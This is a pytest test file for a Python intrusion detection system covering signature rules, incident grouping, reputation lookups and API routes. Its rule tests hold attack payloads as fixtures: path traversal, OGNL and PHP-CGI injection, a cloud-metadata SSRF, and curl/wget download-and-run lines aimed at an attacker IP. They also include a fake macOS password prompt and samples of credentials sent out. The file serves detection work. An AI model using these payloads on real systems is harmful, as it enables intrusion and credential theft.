"""Incidents, automatic reputation checks, their API routes, and the rules added with them."""
from __future__ import annotations

import threading
import time

import pytest

from pynids.alerts.incidents import IncidentTracker, entity_of, extract_iocs
from pynids.alerts.manager import AlertManager
from pynids.alerts.model import Alert, AlertType, Severity
from pynids.alerts.outputs.sqlite_out import SQLiteOutput
from pynids.detection.signature import SignatureDetector
from pynids.engine import BUILTIN_RULES, DetectionEngine, load_rule_files
from pynids.service.api import ServiceContext, make_server
from pynids.service.live import LiveState
from pynids.soc.keys import KeyStore
from pynids.soc.reputation import RULE_ID, Reputation, ReputationOutput
from pynids.soc.workbench import Workbench
from tests.conftest import AlertCollector, make_meta
from tests.test_service import call
from tests.test_soc import FakeHttp

PSH, ACK, SYN = 0x08, 0x10, 0x02
EVIL = "45.33.32.9"


def alert(**kw) -> Alert:
    base = dict(alert_type=AlertType.SIGNATURE, severity=Severity.HIGH, message="m",
                src_ip="192.168.1.5", dst_ip=EVIL, dst_port=443, rule_id="SIG-C2-009",
                mitre_technique="T1496",
                context={"remote_ip": EVIL, "direction": "outbound", "app": "miner", "remote_host": "pool.bad.example"})
    base.update(kw)
    return Alert(**base)


# ---------------------------------------------------------------------------
# New built-in rules
# ---------------------------------------------------------------------------

class TestNewRules:
    def _engine(self):
        mgr = AlertManager(dedup_window=0)
        sink = AlertCollector()
        mgr.register_output(sink)
        return DetectionEngine(config={}, rules_path=str(BUILTIN_RULES), alert_manager=mgr), sink

    def _ids(self, sink):
        return {a.rule_id for a in sink.alerts if a.alert_type == AlertType.SIGNATURE}

    @pytest.mark.parametrize("payload,port,expected", [
        (b"GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1\r\nHost: vpn\r\n\r\n",
         443, "SIG-EXP-011"),
        (b"GET /vpn/../vpns/cfg/smb.conf HTTP/1.1\r\nHost: gw\r\n\r\n", 80, "SIG-EXP-011"),
        (b"POST /mgmt/tm/util/bash HTTP/1.1\r\nHost: f5\r\n\r\n", 80, "SIG-EXP-011"),
        (b"GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime"
         b"%40getRuntime%28%29.exec%28%22id%22%29%29%7D/ HTTP/1.1\r\nHost: wiki\r\n\r\n", 8090, "SIG-EXP-012"),
        (b"GET /x.action HTTP/1.1\r\nHost: a\r\nContent-Type: %{(#_memberAccess=@ognl.OgnlContext@DEFAULT)}\r\n\r\n",
         8080, "SIG-EXP-012"),
        (b"POST /index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1\r\nHost: a\r\n\r\n",
         80, "SIG-EXP-013"),
        (b"GET /uploads/shell.php?cmd=whoami HTTP/1.1\r\nHost: shop\r\n\r\n", 80, "SIG-EXP-014"),
        (b"GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1\r\nHost: a\r\n\r\n",
         80, "SIG-EXP-015"),
        (b"GET / HTTP/1.1\r\nHost: c8a1x.oast.fun\r\n\r\n", 80, "SIG-EXP-016"),
        (b"curl -fsSL http://45.33.32.9/i.sh | sh\n", 4444, "SIG-EXE-007"),
        (b"cd /tmp; wget http://45.33.32.9/x86; chmod +x x86; ./x86\n", 23, "SIG-EXE-007"),
        (b"osascript -e 'display dialog \"macOS needs your password\" default answer \"\" with hidden answer'\n",
         4444, "SIG-EXE-008"),
        (b"0\x2c\x02\x01\x01\x60\x27\x02\x01\x03\x04\x1acn=admin,dc=example,dc=com\x80\x06secret", 389, "SIG-CRED-009"),
        (b"GET /v1/data?api_key=5f4dcc3b5aa765d61d8327deb882cf99 HTTP/1.1\r\nHost: api.example\r\n\r\n",
         80, "SIG-CRED-010"),
        (b"POST /up HTTP/1.1\r\nHost: x\r\n\r\naws_access_key_id=AKIAIOSFODNN7EXAMPLE\n", 8080, "SIG-CRED-011"),
        (b"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n", 9001, "SIG-CRED-011"),  # secret-scan: allow
        (b"GET /admin/get.php HTTP/1.1\r\nHost: 45.33.32.9\r\n"
         b"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\r\n\r\n", 80, "SIG-C2-018"),
        (b"POST /abc HTTP/1.1\r\nHost: webhook.site\r\n\r\n", 80, "SIG-EXF-003"),
        (b"STOR passwords.zip\r\n", 21, "SIG-EXF-005"),
    ])
    def test_payload_rules_fire(self, payload, port, expected):
        engine, sink = self._engine()
        engine.process_packet(make_meta(src_ip="192.168.1.5", dst_ip=EVIL, dst_port=port,
                                        tcp_flags=PSH | ACK, payload=payload))
        assert expected in self._ids(sink)

    @pytest.mark.parametrize("payload,port", [
        # An install guide served over HTTP is a response, not a command being delivered.
        (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<pre>curl -fsSL https://get.example.com/i.sh | sh</pre>", 80),
        # Anonymous LDAP bind: no password on the wire.
        (b"0\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00", 389),
        # Ordinary query strings and a normal PHP page.
        (b"GET /search?q=password+manager&c=1 HTTP/1.1\r\nHost: example.com\r\n\r\n", 80),
        (b"GET /index.php?id=7&cmd=view HTTP/1.1\r\nHost: example.com\r\n\r\n", 80),
        (b"GET /owa/auth/logon.aspx?replaceCurrent=1 HTTP/1.1\r\nHost: mail.example.com\r\n\r\n", 80),
        (b"RETR readme.txt\r\n", 21),
    ])
    def test_lookalikes_stay_silent(self, payload, port):
        engine, sink = self._engine()
        engine.process_packet(make_meta(src_ip="192.168.1.5", dst_ip=EVIL, dst_port=port,
                                        tcp_flags=PSH | ACK, payload=payload))
        new = {i for i in self._ids(sink) if i in {
            "SIG-EXP-011", "SIG-EXP-012", "SIG-EXP-013", "SIG-EXP-014", "SIG-EXP-015", "SIG-EXP-016",
            "SIG-EXE-007", "SIG-EXE-008", "SIG-CRED-009", "SIG-CRED-010", "SIG-CRED-011", "SIG-C2-018",
            "SIG-EXF-003", "SIG-EXF-005"}}
        assert not new

    def test_shell_command_rules_ignore_loopback_and_web_page_bodies(self):
        cmd = b"curl -fsSL http://45.33.32.9/i.sh | sh\n"
        script = b"osascript -e 'do shell script \"id\" with administrator privileges'\n"
        engine, sink = self._engine()
        # The dashboard's own API on 127.0.0.1 quoting an earlier alert must not raise the next one.
        for payload in (cmd, script, b'{"evidence": {"payload_preview": "' + cmd.strip() + b'"}}'):
            engine.process_packet(make_meta(src_ip="127.0.0.1", dst_ip="127.0.0.1", src_port=8787, dst_port=51000,
                                            tcp_flags=PSH | ACK, payload=payload))
        engine.process_packet(make_meta(src_ip="::1", dst_ip="::1", src_port=51001, dst_port=8787,
                                        tcp_flags=PSH | ACK, payload=cmd))
        # A later segment of a web page from the internet: the text is content, not a command.
        engine.process_packet(make_meta(src_ip=EVIL, dst_ip="192.168.1.5", src_port=80, dst_port=52000,
                                        tcp_flags=PSH | ACK, payload=b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>"))
        engine.process_packet(make_meta(src_ip=EVIL, dst_ip="192.168.1.5", src_port=80, dst_port=52000,
                                        tcp_flags=PSH | ACK, payload=b"<pre>" + cmd + b"</pre>"))
        assert not self._ids(sink) & {"SIG-EXE-007", "SIG-EXE-008"}
        # Still caught where it matters: inside a request, and on a raw TCP channel.
        engine.process_packet(make_meta(src_ip=EVIL, dst_ip="192.168.1.5", src_port=40100, dst_port=80, tcp_flags=PSH | ACK,
                                        payload=b"POST /cgi HTTP/1.1\r\nHost: a\r\n\r\nx=;" + cmd))
        engine.process_packet(make_meta(src_ip=EVIL, dst_ip="192.168.1.5", src_port=4444, dst_port=52001,
                                        tcp_flags=PSH | ACK, payload=script))
        assert {"SIG-EXE-007", "SIG-EXE-008"} <= self._ids(sink)

    def test_secrets_only_alert_when_leaving_for_the_internet(self):
        engine, sink = self._engine()
        engine.process_packet(make_meta(src_ip="192.168.1.5", dst_ip="192.168.1.9", dst_port=8080,
                                        tcp_flags=PSH | ACK, payload=b"key AKIAIOSFODNN7EXAMPLE\n"))
        assert "SIG-CRED-011" not in self._ids(sink)

    @pytest.mark.parametrize("layer7,expected", [
        ({"tls": {"sni": "relay-abc123.net.anydesk.com"}}, "SIG-C2-017"),
        ({"dns": {"is_response": False, "query_name": "router7.teamviewer.com"}}, "SIG-C2-017"),
        ({"tls": {"sni": "g.api.mega.co.nz"}}, "SIG-EXF-004"),
        ({"tls": {"sni": "omega.nz"}}, None),
        ({"tls": {"sni": "eo1abc.m.pipedream.net"}}, "SIG-EXF-003"),
        ({"dns": {"is_response": False, "query_name": "x1.oastify.com"}}, "SIG-EXP-016"),
        ({"tls": {"sni": "www.teamviewer.com"}}, None),          # the website, not a session
        ({"tls": {"sni": "notwebhook.site.example.com"}}, None),
    ])
    def test_name_rules(self, layer7, expected):
        det = SignatureDetector(load_rule_files([str(BUILTIN_RULES)]))
        ids = {a.rule_id for a in det.analyze(make_meta(src_ip="192.168.1.5", dst_ip=EVIL, dst_port=443), layer7, None)}
        mine = ids & {"SIG-C2-017", "SIG-EXF-003", "SIG-EXF-004", "SIG-EXP-016"}
        assert mine == ({expected} if expected else set())

    def test_spam_burst_and_ssdp(self):
        engine, sink = self._engine()
        for i in range(15):
            engine.process_packet(make_meta(src_ip="192.168.1.5", dst_ip=f"45.33.{i}.7", dst_port=25,
                                            src_port=50000 + i, tcp_flags=SYN))
        engine.process_packet(make_meta(src_ip="185.220.101.4", dst_ip="192.168.1.5", dst_port=1900, protocol="udp",
                                        payload=b"M-SEARCH * HTTP/1.1\r\nST: ssdp:all\r\n\r\n"))
        assert {"SIG-IMP-004", "SIG-IMP-005"} <= self._ids(sink)


# ---------------------------------------------------------------------------
# Incident tracker
# ---------------------------------------------------------------------------

@pytest.fixture
def tracked(tmp_path):
    db = tmp_path / "events.db"
    store = SQLiteOutput(str(db), batch_size=0)
    tracker = IncidentTracker(db, gap=600, before_read=store.flush, flush_interval=0)

    def add(**kw):
        a = alert(**kw)
        store.emit(a)
        tracker.emit(a)
        return a

    yield tracker, add, store, db
    tracker.close()
    store.close()


class TestIncidents:
    def test_entity_prefers_program_then_domain_then_remote_address(self):
        prog = alert(alert_type=AlertType.BEHAVIORAL, tags=["host_risk"], rule_id="HOST-1",
                     context={"exe": "/tmp/x", "app": "x", "remote_ip": EVIL}).to_dict()
        assert entity_of(prog) == ("program", "/tmp/x", "x")
        dns = alert(dst_ip="192.168.1.1", dst_port=53, context={"remote_ip": "192.168.1.1"},
                    evidence={"layer7": {"dns": {"query_name": "a.b.evil-c2.top"}}}).to_dict()
        assert entity_of(dns) == ("domain", "evil-c2.top", None)
        assert entity_of(alert().to_dict()) == ("ip", EVIL, "pool.bad.example")
        inbound = alert(src_ip="185.220.101.4", dst_ip="192.168.1.5", context={"direction": "inbound"}).to_dict()
        assert entity_of(inbound)[:2] == ("ip", "185.220.101.4")

    def test_traffic_passing_by_is_filed_under_its_internet_side(self):
        # No enrichment (or a mirror port): "remote" defaults to the destination.
        scan = alert(src_ip="185.220.101.4", dst_ip="192.168.1.5",
                     context={"direction": "transit", "remote_ip": "192.168.1.5", "remote_host": "shop"}).to_dict()
        assert entity_of(scan) == ("ip", "185.220.101.4", None)
        out = alert(src_ip="192.168.1.5", dst_ip=EVIL, context={"direction": "transit", "remote_ip": EVIL}).to_dict()
        assert entity_of(out)[:2] == ("ip", EVIL)
        assert entity_of(alert(src_ip="192.168.1.5", dst_ip=None, context={},
                               alert_type=AlertType.CORRELATION).to_dict())[:2] == ("ip", "192.168.1.5")

    def test_alerts_about_one_subject_form_one_incident(self, tracked):
        tracker, add, _, _ = tracked
        now = time.time()
        add(timestamp=now - 300, rule_id="SIG-C2-010", mitre_technique="T1496", severity=Severity.MEDIUM)
        add(timestamp=now - 200, rule_id="SIG-C2-009")
        add(timestamp=now - 100, rule_id="DET-EXFIL", mitre_technique="T1041", alert_type=AlertType.BEHAVIORAL)
        add(timestamp=now - 50, dst_ip="93.184.215.14", context={"remote_ip": "93.184.215.14", "direction": "outbound"})
        # Privacy telemetry never opens an incident.
        add(rule_id="STEALTH-TRACKER", tags=["tracker"], severity=Severity.LOW, alert_type=AlertType.BEHAVIORAL)

        listing = tracker.list()
        assert listing["total"] == 2
        main = next(i for i in listing["incidents"] if i["entity"]["value"] == EVIL)
        assert main["alert_count"] == 3 and main["severity"] == "HIGH" and main["status"] == "open"
        assert main["tactics"] == ["Exfiltration", "Impact"]
        assert main["entity"]["label"] == "pool.bad.example" and main["apps"] == ["miner"]
        assert {r["id"] for r in main["rules"]} == {"SIG-C2-010", "SIG-C2-009", "DET-EXFIL"}

        assert [i["entity"]["value"] for i in tracker.list(tactic="exfiltration")["incidents"]] == [EVIL]
        assert tracker.list(technique_id="T1041")["total"] == 1 and tracker.list(rule="nope")["total"] == 0
        assert tracker.list(since=now + 10)["total"] == 0

    def test_detail_has_timeline_indicators_and_programs(self, tracked):
        tracker, add, _, _ = tracked
        first = add(context={"remote_ip": EVIL, "direction": "outbound", "app": "miner", "exe": "/tmp/miner",
                             "remote_host": "pool.bad.example"},
                    evidence={"layer7": {"http": {"host": "pool.bad.example", "uri": "/job?x=1"}}})
        add(rule_id="SIG-C2-010")
        incident_id = tracker.incident_of(first.alert_id)
        detail = tracker.get(incident_id)
        assert [a["alert_id"] for a in detail["alerts"]][0] == first.alert_id and len(detail["alerts"]) == 2
        assert detail["alerts"][0]["about"]["summary"] and detail["alerts"][0]["kind"] == "attack"
        iocs = {(i["type"], i["value"]): i for i in detail["iocs"]}
        assert iocs[("ipv4", EVIL)]["public"] and iocs[("ipv4", EVIL)]["count"] == 2
        assert ("domain", "pool.bad.example") in iocs and ("url", "http://pool.bad.example/job?x=1") in iocs
        assert not iocs[("ipv4", "192.168.1.5")]["public"]
        assert detail["programs"] == [{"exe": "/tmp/miner", "app": "miner"}]
        assert tracker.get("INC-missing") is None

    def test_a_quiet_gap_or_closing_starts_a_new_incident(self, tracked):
        tracker, add, _, _ = tracked
        now = time.time()
        a = add(timestamp=now - 5000)
        b = add(timestamp=now - 100)          # more than the 600 s gap later
        assert tracker.incident_of(a.alert_id) != tracker.incident_of(b.alert_id)
        current = tracker.incident_of(b.alert_id)
        assert tracker.update(current, status="closed", note="miner removed")
        c = add(timestamp=now - 50)
        assert tracker.incident_of(c.alert_id) != current
        assert tracker.get(current)["note"] == "miner removed"
        assert [i["status"] for i in tracker.list(status="closed")["incidents"]] == ["closed"]
        assert all(i["status"] != "closed" for i in tracker.list(status="active")["incidents"])
        with pytest.raises(ValueError):
            tracker.update(current, status="deleted")
        assert not tracker.update("INC-missing", status="open")

    def test_low_only_incidents_are_filtered_by_severity(self, tracked):
        tracker, add, _, _ = tracked
        add(severity=Severity.LOW, rule_id="SIG-REC-005")
        assert tracker.list(min_severity="MEDIUM")["total"] == 0 and tracker.list()["total"] == 1

    def test_backfill_files_stored_alerts_once_and_prune_forgets(self, tmp_path):
        db = tmp_path / "events.db"
        store = SQLiteOutput(str(db), batch_size=0)
        now = time.time()
        for i in range(3):
            store.emit(alert(timestamp=now - 40 * 86400 + i))
        store.emit(alert(timestamp=now - 60, dst_ip="93.184.215.14",
                         context={"remote_ip": "93.184.215.14", "direction": "outbound"}))
        tracker = IncidentTracker(db, gap=600)
        assert tracker.backfill() == 4 and tracker.backfill() == 0
        assert sorted(i["alert_count"] for i in tracker.list()["incidents"]) == [1, 3]
        assert tracker.prune(30) == 1 and tracker.list()["total"] == 1
        tracker.close()
        store.close()

    def test_indicators_skip_what_is_not_one(self):
        iocs = extract_iocs([alert(evidence={"sha256": "a" * 64, "host": "not a host", "url": 5}).to_dict()])
        assert ("sha256", "a" * 64) in {(i["type"], i["value"]) for i in iocs}
        assert all(i["type"] != "email" for i in iocs)


# ---------------------------------------------------------------------------
# Reputation
# ---------------------------------------------------------------------------

VT_BAD = {"data": {"attributes": {"last_analysis_stats": {"malicious": 14, "suspicious": 1, "harmless": 50},
                                  "as_owner": "Bad Hosting"}}}
VT_CLEAN = {"data": {"attributes": {"last_analysis_stats": {"malicious": 0, "suspicious": 0, "harmless": 70}}}}
ABUSE_BAD = {"data": {"abuseConfidenceScore": 100, "totalReports": 312}}


def make_rep(tmp_path, routes, keys=("virustotal", "abuseipdb"), **kw):
    store = KeyStore(tmp_path / "keys.json")
    for k in keys:
        store.set(k, "k")
    http = FakeHttp(routes)
    wb = Workbench(tmp_path / "soc.db", keys=store, http=http)
    wb.limiter.acquire = lambda name, per_minute: None      # the per-minute limiter has its own test
    raised = []
    rep = Reputation(wb, emit=raised.append, db_path=tmp_path / "soc.db", sleep=lambda s: None, **kw)
    return rep, http, raised


class TestReputation:
    def test_manual_check_combines_sources(self, tmp_path):
        rep, http, _ = make_rep(tmp_path, {"virustotal.com": (200, VT_BAD), "abuseipdb.com": (200, ABUSE_BAD),
                                           "greynoise.io": (404, "")})
        assert rep.summary("ipv4", EVIL)["checked"] == 0 and not http.calls   # reading never sends anything
        out = rep.check("ipv4", EVIL)
        assert out["verdict"] == "malicious" and set(out["malicious_by"]) == {"virustotal", "abuseipdb"}
        assert out["flagged_by"] == ["VirusTotal", "AbuseIPDB"] and out["checked"] == 3
        vt = next(s for s in out["sources"] if s["source"] == "virustotal")
        assert vt["headline"].startswith("Detections: 14 malicious")
        # abuse.ch and OTX have no key: listed as missing, never called.
        assert {m["name"] for m in out["missing_keys"]} == {"otx", "urlhaus", "threatfox"}
        assert not [c for c in http.calls if "abuse.ch" in c[1] or "otx" in c[1]]
        calls = len(http.calls)
        assert rep.summary("ipv4", EVIL)["verdict"] == "malicious" and len(http.calls) == calls

    def test_private_and_invalid_indicators_never_leave(self, tmp_path):
        rep, http, _ = make_rep(tmp_path, {})
        assert rep.check("ipv4", "192.168.1.9")["private"] and rep.check("domain", "printer.local")["private"]
        assert rep.check("ipv4", "not-an-ip")["error"]
        assert not rep.enqueue("ipv4", "10.0.0.8") and not http.calls

    def test_url_goes_out_without_its_query_string(self, tmp_path):
        rep, http, _ = make_rep(tmp_path, {"virustotal.com": (200, VT_CLEAN)}, keys=("virustotal",))
        out = rep.check("url", "http://files.example.com/a.exe?token=SECRET#x")
        assert out["value"] == "http://files.example.com/a.exe" and out["verdict"] == "clean"
        assert all("SECRET" not in str(c) for c in http.calls)

    def test_automatic_check_raises_one_alert_with_the_original_context(self, tmp_path):
        rep, http, raised = make_rep(tmp_path, {"virustotal.com": (200, VT_BAD), "abuseipdb.com": (200, ABUSE_BAD),
                                                "greynoise.io": (404, "")})
        origin = alert()
        rep.process("ipv4", EVIL, origin)
        assert len(raised) == 1
        hit = raised[0]
        assert hit.rule_id == RULE_ID and hit.alert_type == AlertType.THREAT_INTEL
        assert hit.severity == Severity.CRITICAL and "reputation" in hit.tags      # two sources agree
        assert hit.context["app"] == "miner" and hit.dst_ip == EVIL
        assert hit.evidence["indicator"] == EVIL and hit.evidence["triggered_by"]["alert_id"] == origin.alert_id
        rep.process("ipv4", EVIL, origin)
        assert len(raised) == 1                                                    # once a week per indicator
        assert rep.status()["flagged"] == 1 and rep.status()["checked"] == 2

    def test_one_weak_opinion_is_not_enough(self, tmp_path):
        clean_vt = {"virustotal.com": (200, VT_CLEAN), "greynoise.io": (200, {"classification": "malicious", "noise": True})}
        rep, _, raised = make_rep(tmp_path, clean_vt, keys=("virustotal", "greynoise"))
        out = rep.process("ipv4", EVIL, alert())
        assert out["verdict"] == "malicious" and out["malicious_by"] == ["greynoise"] and not raised

    def test_program_hash_is_checked_never_the_file(self, tmp_path):
        exe = tmp_path / "dropper"
        exe.write_bytes(b"MZ not really")
        sha = "b" * 64
        rep, http, raised = make_rep(tmp_path, {"virustotal.com/api/v3/files/" + sha: (200, VT_BAD)},
                                     keys=("virustotal",), hasher=lambda path: sha)
        rep.process("exe", str(exe), alert(context={"exe": str(exe), "app": "dropper"}))
        assert raised and "dropper is known malware" in raised[0].message
        assert raised[0].severity == Severity.HIGH and raised[0].evidence["program"] == str(exe)
        assert all(c[0] == "GET" and c[3] is None for c in http.calls)

    def test_output_queues_the_indicators_behind_notable_alerts(self, tmp_path):
        rep, _, _ = make_rep(tmp_path, {})
        queued = []
        rep.enqueue = lambda kind, value, origin=None: queued.append((kind, value)) or True
        out = ReputationOutput(rep, min_severity=Severity.MEDIUM)
        out.emit(alert(severity=Severity.LOW))
        out.emit(alert(rule_id="STEALTH-TRACKER"))
        out.emit(alert(tags=["reputation"]))
        assert not queued
        out.emit(alert(context={"remote_ip": EVIL, "remote_host": "pool.bad.example", "exe": "/tmp/miner",
                                "signature": "unsigned"},
                       evidence={"layer7": {"http": {"host": "pool.bad.example", "uri": "/x.sh", "direction": "request"}}}))
        assert set(queued) == {("ipv4", EVIL), ("domain", "pool.bad.example"),
                               ("url", "http://pool.bad.example/x.sh"), ("exe", "/tmp/miner")}
        queued.clear()
        out.emit(alert(context={"remote_ip": EVIL, "exe": "/usr/bin/curl", "signature": "apple"}))
        assert queued == [("ipv4", EVIL)]

    def test_unattended_checks_only_use_sources_with_a_stored_key(self, tmp_path):
        routes = {"virustotal.com": (200, VT_BAD), "greynoise.io": (404, "")}
        rep, http, raised = make_rep(tmp_path, routes, keys=())
        assert not rep.enqueue("ipv4", EVIL)                       # nothing to ask: nothing leaves
        assert rep.process("ipv4", EVIL, alert())["checked"] == 0 and not http.calls and not raised
        assert rep.check("ipv4", EVIL)["checked"] == 1             # asked by hand: keyless GreyNoise answers
        assert [c[1] for c in http.calls if "greynoise" in c[1]] and not [c for c in http.calls if "virustotal" in c[1]]
        assert all(not s["automatic"] for s in rep.status()["sources"])

    def test_manual_mode_and_budget(self, tmp_path):
        rep, _, _ = make_rep(tmp_path, {}, mode="manual")
        assert not rep.automatic and not rep.enqueue("ipv4", EVIL)
        rep, _, _ = make_rep(tmp_path, {}, max_auto_per_hour=2)
        assert rep.enqueue("ipv4", "45.33.32.1") and rep.enqueue("ipv4", "45.33.32.2")
        assert not rep.enqueue("ipv4", "45.33.32.1")        # already queued
        assert not rep.enqueue("ipv4", "45.33.32.3")        # hourly budget used up
        off, _, _ = make_rep(tmp_path, {}, enabled=False)
        assert not off.automatic

    def test_failing_source_is_paused_and_daily_quota_respected(self, tmp_path):
        rep, http, raised = make_rep(tmp_path, {"virustotal.com": (500, "boom"), "abuseipdb.com": (200, ABUSE_BAD),
                                                "greynoise.io": (404, "")})
        rep.process("ipv4", EVIL, alert())
        assert rep.status()["sources"][0]["paused"] and len(raised) == 1          # AbuseIPDB alone is enough
        before = len([c for c in http.calls if "virustotal" in c[1]])
        rep.process("ipv4", "45.33.32.77", alert())
        assert len([c for c in http.calls if "virustotal" in c[1]]) == before     # skipped while paused
        rep._day = (time.strftime("%Y-%m-%d", time.gmtime()), {"abuseipdb": 800})
        calls = len(http.calls)
        rep.process("ipv4", "45.33.32.78", alert())
        assert not [c for c in http.calls[calls:] if "abuseipdb" in c[1]]


# ---------------------------------------------------------------------------
# API
# ---------------------------------------------------------------------------

@pytest.fixture
def inc_api(tmp_path):
    db = tmp_path / "events.db"
    live = LiveState()
    store = SQLiteOutput(str(db), batch_size=0)
    tracker = IncidentTracker(db, gap=600, before_read=store.flush, flush_interval=0)
    rep, http, raised = make_rep(tmp_path, {"virustotal.com": (200, VT_BAD), "greynoise.io": (404, "")},
                                 keys=("virustotal",))
    mgr = AlertManager(dedup_window=0)
    for out in (live, store, tracker):
        mgr.register_output(out)
    ctx = ServiceContext(live=live, token="t0ken", db_path=db, status=lambda: {"state": "running"},
                         incidents=tracker, reputation=rep)
    server = make_server(ctx, "127.0.0.1", 0)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    yield type("Env", (), {"port": server.server_address[1], "mgr": mgr, "http": http})
    server.shutdown()
    server.server_close()
    tracker.close()
    store.close()


class TestIncidentApi:
    def test_list_detail_triage(self, inc_api):
        port = inc_api.port
        first = alert(rule_id="SIG-C2-010", mitre_technique="T1071.004")
        inc_api.mgr.add(first)
        inc_api.mgr.add(alert(rule_id="SIG-C2-009", mitre_technique="T1496"))
        code, listing = call(port, "/api/incidents?min_severity=MEDIUM")
        assert code == 200 and listing["total"] == 1 and listing["counts"]["open"] == 1
        inc = listing["incidents"][0]
        assert inc["alert_count"] == 2 and inc["tactics"] == ["Command and Control", "Impact"]

        code, detail = call(port, "/api/incidents/" + inc["incident_id"])
        assert code == 200 and len(detail["alerts"]) == 2
        ip = next(i for i in detail["iocs"] if i["value"] == EVIL)
        assert ip["reputation"]["checked"] == 0 and not inc_api.http.calls       # opening an incident sends nothing
        assert detail["reputation_status"]["automatic"]

        code, alert_detail = call(port, "/api/alerts/" + first.alert_id)
        assert alert_detail["incident_id"] == inc["incident_id"]

        code, updated = call(port, "/api/incidents/" + inc["incident_id"], method="POST",
                             body={"status": "acknowledged", "note": "looking"})
        assert code == 200 and updated["status"] == "acknowledged" and updated["note"] == "looking"
        assert call(port, "/api/incidents/" + inc["incident_id"], method="POST", body={"status": "nope"})[0] == 400
        assert call(port, "/api/incidents/INC-missing")[0] == 404
        assert call(port, "/api/incidents", token=None)[0] == 401

    def test_alerts_can_be_filtered_by_tactic(self, inc_api):
        inc_api.mgr.add(alert(rule_id="A", mitre_technique="T1071.004"))
        inc_api.mgr.add(alert(rule_id="B", mitre_technique="T1110"))
        inc_api.mgr.add(alert(rule_id="C", mitre_technique="T9999"))
        inc_api.mgr.add(alert(rule_id="D", mitre_technique=None))
        by = lambda tactic: {a["rule_id"] for a in call(inc_api.port, "/api/alerts?tactic=" + tactic)[1]}  # noqa: E731
        assert by("Command%20and%20Control") == {"A"} and by("Credential%20Access") == {"B"}
        assert by("Other") == {"C"}
        assert call(inc_api.port, "/api/incidents?tactic=Credential%20Access")[1]["total"] == 1

    def test_built_in_detectors_are_selected_by_label(self, inc_api):
        inc_api.mgr.add(alert(rule_id=None, alert_type=AlertType.BEHAVIORAL, tags=["beaconing"], message="beacon"))
        inc_api.mgr.add(alert(rule_id=None, alert_type=AlertType.BEHAVIORAL, tags=["dga"], message="dga"))
        inc_api.mgr.add(alert(rule_id="SIG-C2-009", tags=["beaconing"]))
        code, rows = call(inc_api.port, "/api/alerts?detector=beaconing")
        assert code == 200 and [a["message"] for a in rows] == ["beacon"]
        found = call(inc_api.port, "/api/incidents?rule=detector:beaconing")[1]
        assert found["total"] == 1 and "detector:dga" in {r["id"] for r in found["incidents"][0]["rules"]}

    def test_reputation_routes(self, inc_api):
        port = inc_api.port
        code, status = call(port, "/api/reputation")
        assert code == 200 and status["automatic"] and status["sources"][0]["name"] == "virustotal"
        code, known = call(port, f"/api/reputation?type=ipv4&value={EVIL}")
        assert code == 200 and known["checked"] == 0
        code, checked = call(port, "/api/reputation", method="POST", body={"type": "ipv4", "value": EVIL})
        assert code == 200 and checked["verdict"] == "malicious" and checked["flagged_by"] == ["VirusTotal"]
        assert call(port, f"/api/reputation?type=ipv4&value={EVIL}")[1]["verdict"] == "malicious"
        assert call(port, "/api/reputation", method="POST", body={})[0] == 400
